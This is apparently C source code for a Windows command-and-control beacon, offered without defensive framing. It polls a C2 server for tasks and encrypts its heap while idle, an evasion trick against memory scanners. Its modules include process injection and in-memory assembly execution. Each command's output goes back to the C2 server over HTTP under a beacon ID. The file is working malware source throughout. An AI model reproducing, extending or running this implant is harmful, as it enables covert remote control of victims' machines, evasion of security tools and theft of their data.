#include "helpers.h"

//----------------[globals]-------------------------------------------------//

static HANDLE g_hPollingThread = NULL;
static volatile BOOL g_bStopPolling = FALSE;

static CRITICAL_SECTION g_heapCriticalSection;
static BOOL g_heapCriticalSectionInitialized = FALSE;
static CRITICAL_SECTION g_encryptionCriticalSection;
static BOOL g_encryptionCriticalSectionInitialized = FALSE;

static BYTE g_xorKey[32] = { 0 };
static LPVOID* g_encryptedRegions = NULL;
static SIZE_T* g_regionSizes = NULL;
static DWORD g_regionCount = 0;
static DWORD g_maxRegions = 100;
static BOOL g_heapEncrypted = FALSE;
static BOOL g_encryptionEnabled = FALSE;

//----------------[forward declarations]------------------------------------//

void* safe_malloc(size_t size);
void* safe_realloc(void* ptr, size_t size);
void safe_free(void* ptr);

//----------------[handler]-------------------------------------------------//

void asyncHandler() {
    if (!g_heapCriticalSectionInitialized) {
        InitializeCriticalSection(&g_heapCriticalSection);
        g_heapCriticalSectionInitialized = TRUE;
    }
    
    if (!g_encryptionCriticalSectionInitialized) {
        InitializeCriticalSection(&g_encryptionCriticalSection);
        g_encryptionCriticalSectionInitialized = TRUE;
    }

    initializeMemoryEncryption();

    g_hPollingThread = CreateThread(NULL, 0, pollingThread, NULL, 0, NULL);
    if (g_hPollingThread == NULL) {
        printf("Failed to create polling thread\n");
        return;
    }

    printf("Async handler started\n");

    while (!g_bStopPolling) {
        Sleep(1000);
    }

    if (g_hPollingThread != NULL) {
        WaitForSingleObject(g_hPollingThread, INFINITE);
        CloseHandle(g_hPollingThread);
    }

    cleanupMemoryEncryption();
    
    if (g_heapCriticalSectionInitialized) {
        DeleteCriticalSection(&g_heapCriticalSection);
        g_heapCriticalSectionInitialized = FALSE;
    }
    
    if (g_encryptionCriticalSectionInitialized) {
        DeleteCriticalSection(&g_encryptionCriticalSection);
        g_encryptionCriticalSectionInitialized = FALSE;
    }
}

//----------------[polling]-------------------------------------------------//

DWORD WINAPI pollingThread(LPVOID lpParam) {
    UNREFERENCED_PARAMETER(lpParam);

    register_base();

    while (!g_bStopPolling) {
        if (g_encryptionEnabled) {
            EnterCriticalSection(&g_encryptionCriticalSection);
            decryptHeap();
            LeaveCriticalSection(&g_encryptionCriticalSection);
        }

        request_action();

        if (g_encryptionEnabled) {
            EnterCriticalSection(&g_encryptionCriticalSection);
            encryptHeap();
            LeaveCriticalSection(&g_encryptionCriticalSection);
        }

        Sleep(g_pollingInterval);
    }

    return 0;
}

//----------------[memory]--------------------------------------------------//

void* safe_malloc(size_t size) {
    void* ptr = NULL;
    
    if (g_heapCriticalSectionInitialized) {
        EnterCriticalSection(&g_heapCriticalSection);
    }
    
    if (g_encryptionEnabled && g_encryptionCriticalSectionInitialized) {
        EnterCriticalSection(&g_encryptionCriticalSection);
        if (g_heapEncrypted) {
            decryptHeap();
        }
        LeaveCriticalSection(&g_encryptionCriticalSection);
    }
    
    ptr = malloc(size);
    
    if (g_heapCriticalSectionInitialized) {
        LeaveCriticalSection(&g_heapCriticalSection);
    }
    
    return ptr;
}

void* safe_realloc(void* ptr, size_t size) {
    void* newPtr = NULL;
    
    if (g_heapCriticalSectionInitialized) {
        EnterCriticalSection(&g_heapCriticalSection);
    }
    
    if (g_encryptionEnabled && g_encryptionCriticalSectionInitialized) {
        EnterCriticalSection(&g_encryptionCriticalSection);
        if (g_heapEncrypted) {
            decryptHeap();
        }
        LeaveCriticalSection(&g_encryptionCriticalSection);
    }
    
    newPtr = realloc(ptr, size);
    
    if (g_heapCriticalSectionInitialized) {
        LeaveCriticalSection(&g_heapCriticalSection);
    }
    
    return newPtr;
}

void safe_free(void* ptr) {
    if (ptr == NULL) return;
    
    if (g_heapCriticalSectionInitialized) {
        EnterCriticalSection(&g_heapCriticalSection);
    }
    
    if (g_encryptionEnabled && g_encryptionCriticalSectionInitialized) {
        EnterCriticalSection(&g_encryptionCriticalSection);
        if (g_heapEncrypted) {
            decryptHeap();
        }
        LeaveCriticalSection(&g_encryptionCriticalSection);
    }
    
    free(ptr);
    
    if (g_heapCriticalSectionInitialized) {
        LeaveCriticalSection(&g_heapCriticalSection);
    }
}

//----------------[heap encryption]-----------------------------------------//

void initializeMemoryEncryption() {
    if (!g_encryptionCriticalSectionInitialized) {
        return;
    }
    
    EnterCriticalSection(&g_encryptionCriticalSection);
    
    HCRYPTPROV hCryptProv;
    if (CryptAcquireContextA(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hCryptProv, sizeof(g_xorKey), g_xorKey);
        CryptReleaseContext(hCryptProv, 0);
    } else {
        DWORD tick = GetTickCount();
        for (int i = 0; i < sizeof(g_xorKey); i++) {
            g_xorKey[i] = (BYTE)((tick + i) ^ (tick >> 8) ^ (tick >> 16));
        }
    }

    g_encryptedRegions = (LPVOID*)malloc(g_maxRegions * sizeof(LPVOID));
    g_regionSizes = (SIZE_T*)malloc(g_maxRegions * sizeof(SIZE_T));
    
    if (g_encryptedRegions == NULL || g_regionSizes == NULL) {
        printf("ERROR: Failed to allocate encryption tracking arrays\n");
        g_encryptionEnabled = FALSE;
        if (g_encryptedRegions) {
            free(g_encryptedRegions);
            g_encryptedRegions = NULL;
        }
        if (g_regionSizes) {
            free(g_regionSizes);
            g_regionSizes = NULL;
        }
    }
    
    g_regionCount = 0;
    g_heapEncrypted = FALSE;
    
    LeaveCriticalSection(&g_encryptionCriticalSection);
}

void encryptHeap() {
    if (!g_encryptionEnabled || !g_encryptionCriticalSectionInitialized) {
        return;
    }
    
    if (g_heapEncrypted) {
        return;
    }

    HANDLE hHeap = GetProcessHeap();
    if (hHeap == NULL) {
        return;
    }

    if (!HeapLock(hHeap)) {
        printf("ERROR: Failed to lock heap for encryption\n");
        return;
    }

    PROCESS_HEAP_ENTRY entry;
    entry.lpData = NULL;
    g_regionCount = 0;

    while (HeapWalk(hHeap, &entry) && g_regionCount < g_maxRegions) {
        if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) {
            if (entry.cbData > 0 && entry.lpData != NULL) {
                if (!IsBadReadPtr(entry.lpData, entry.cbData) && 
                    !IsBadWritePtr(entry.lpData, entry.cbData)) {
                    
                    g_encryptedRegions[g_regionCount] = entry.lpData;
                    g_regionSizes[g_regionCount] = entry.cbData;
                    xorEncryptMemory((BYTE*)entry.lpData, entry.cbData);
                    g_regionCount++;
                }
            }
        }
    }

    HeapUnlock(hHeap);
    g_heapEncrypted = TRUE;
    
    printf("DEBUG: Encrypted %lu heap regions\n", g_regionCount);
}

void decryptHeap() {
    if (!g_encryptionEnabled || !g_encryptionCriticalSectionInitialized) {
        return;
    }
    
    if (!g_heapEncrypted) {
        return;
    }

    HANDLE hHeap = GetProcessHeap();
    if (hHeap == NULL) {
        return;
    }

    if (!HeapLock(hHeap)) {
        printf("ERROR: Failed to lock heap for decryption\n");
        return;
    }

    DWORD validRegions = 0;
    for (DWORD i = 0; i < g_regionCount; i++) {
        if (g_encryptedRegions[i] != NULL && g_regionSizes[i] > 0) {
            if (!IsBadReadPtr(g_encryptedRegions[i], g_regionSizes[i]) &&
                !IsBadWritePtr(g_encryptedRegions[i], g_regionSizes[i])) {
                
                SIZE_T heapSize = HeapSize(hHeap, 0, g_encryptedRegions[i]);
                if (heapSize != (SIZE_T)-1 && heapSize >= g_regionSizes[i]) {
                    xorEncryptMemory((BYTE*)g_encryptedRegions[i], g_regionSizes[i]);
                    validRegions++;
                } else {
                    printf("DEBUG: Skipping invalid region %lu (size mismatch)\n", i);
                }
            } else {
                printf("DEBUG: Skipping invalid region %lu (bad pointer)\n", i);
            }
        }
    }

    HeapUnlock(hHeap);
    g_heapEncrypted = FALSE;
    
    printf("DEBUG: Decrypted %lu valid heap regions out of %lu total\n", validRegions, g_regionCount);
}

void xorEncryptMemory(BYTE* data, SIZE_T size) {
    if (data == NULL || size == 0) {
        return;
    }

    DWORD oldProtect;
    if (!VirtualProtect(data, size, PAGE_READWRITE, &oldProtect)) {
        printf("ERROR: Failed to change memory protection for encryption\n");
        return;
    }

    for (SIZE_T i = 0; i < size; i++) {
        data[i] ^= g_xorKey[i % sizeof(g_xorKey)];
    }

    VirtualProtect(data, size, oldProtect, &oldProtect);
}

void cleanupMemoryEncryption() {
    if (!g_encryptionCriticalSectionInitialized) {
        return;
    }
    
    EnterCriticalSection(&g_encryptionCriticalSection);
    
    if (g_heapEncrypted) {
        decryptHeap();
    }

    ZeroMemory(g_xorKey, sizeof(g_xorKey));

    if (g_encryptedRegions) {
        free(g_encryptedRegions);
        g_encryptedRegions = NULL;
    }

    if (g_regionSizes) {
        free(g_regionSizes);
        g_regionSizes = NULL;
    }

    g_regionCount = 0;
    g_encryptionEnabled = FALSE;
    
    LeaveCriticalSection(&g_encryptionCriticalSection);
}

//----------------[module execution]----------------------------------------//

void execute_module(const char* moduleName, const char* moduleParams) {
    if (moduleName == NULL) {
        printf("ERROR: Module name is NULL\n");
        return;
    }

    printf("Executing module function: %s\n", moduleName);

    char* moduleOutput = NULL;

    if (strcmp(moduleName, "whoami") == 0) {
        moduleOutput = whoami_module(moduleParams);
    } else if (strcmp(moduleName, "pwd") == 0) {
        moduleOutput = pwd_module(moduleParams);
    } else if (strcmp(moduleName, "ls") == 0) {
        moduleOutput = ls_module(moduleParams);
    } else if (strcmp(moduleName, "ps") == 0) {
        moduleOutput = ps_module(moduleParams);
    } else if (strcmp(moduleName, "inject") == 0) {
        char* paramsCopy = _strdup(moduleParams);
        char* pipePos = strchr(paramsCopy, '|');
        
        if (pipePos != NULL) {
            *pipePos = '\0';
            char* pidStr = paramsCopy;
            char* contentStr = pipePos + 1;
            DWORD targetPid = (DWORD)strtoul(pidStr, NULL, 10);
            
            printf("DEBUG: inject module params - targetPid: %lu, content length: %zu\n",
                targetPid, strlen(contentStr));
            
            int injectResult = inject_module(targetPid, contentStr);
            if (injectResult == 0) {
                moduleOutput = _strdup("Injection successful");
            } else {
                moduleOutput = _strdup("Injection failed");
            }
        } else {
            printf("ERROR: Invalid inject module parameters format\n");
            moduleOutput = _strdup("ERROR: Invalid inject module parameters format");
        }
        
        free(paramsCopy);
    } else if (strcmp(moduleName, "execute_assembly") == 0) {
        size_t paramsLen = moduleParams ? strlen(moduleParams) : 0;
        printf("Executing execute_assembly module with %zu bytes of parameters\n", paramsLen);
        moduleOutput = execute_assembly_module(moduleParams);
    } else {
        printf("ERROR: Unknown module: %s\n", moduleName);
        moduleOutput = _strdup("ERROR: Unknown module");
    }

    if (moduleOutput != NULL && strlen(moduleOutput) > 0) {
        printf("Module output: %s\n", moduleOutput);

        size_t messageSize = strlen("command_output|") + strlen(g_beaconId) + 1 + strlen(moduleOutput) + 1;
        char* commandOutputMessage = (char*)safe_malloc(messageSize);
        
        if (commandOutputMessage != NULL) {
            snprintf(commandOutputMessage, messageSize,
                "command_output|%s|%s", g_beaconId, moduleOutput);

            printf("Sending command output to C2 (%zu bytes)\n", strlen(commandOutputMessage));

            char* responseData = httpSendToServer(commandOutputMessage);
            if (responseData != NULL) {
                printf("Module output sent to C2, response: %s\n", responseData);
                free(responseData);
            } else {
                printf("DEBUG: No response from C2 server\n");
            }
            
            safe_free(commandOutputMessage);
        }
        
        free(moduleOutput);
    } else {
        printf("No output from module\n");
        char commandOutputMessage[256];
        snprintf(commandOutputMessage, sizeof(commandOutputMessage),
            "command_output|%s|Module completed with no output", g_beaconId);

        char* responseData = httpSendToServer(commandOutputMessage);
        if (responseData != NULL) {
            printf("Completion notification sent to C2, response: %s\n", responseData);
            free(responseData);
        }
        
        if (moduleOutput != NULL) {
            free(moduleOutput);
        }
    }

    printf("DEBUG: execute_module function completed\n");
}


void shutdown_base() {
    g_bStopPolling = TRUE;
    printf("Shutdown signal sent. Exiting...\n");
}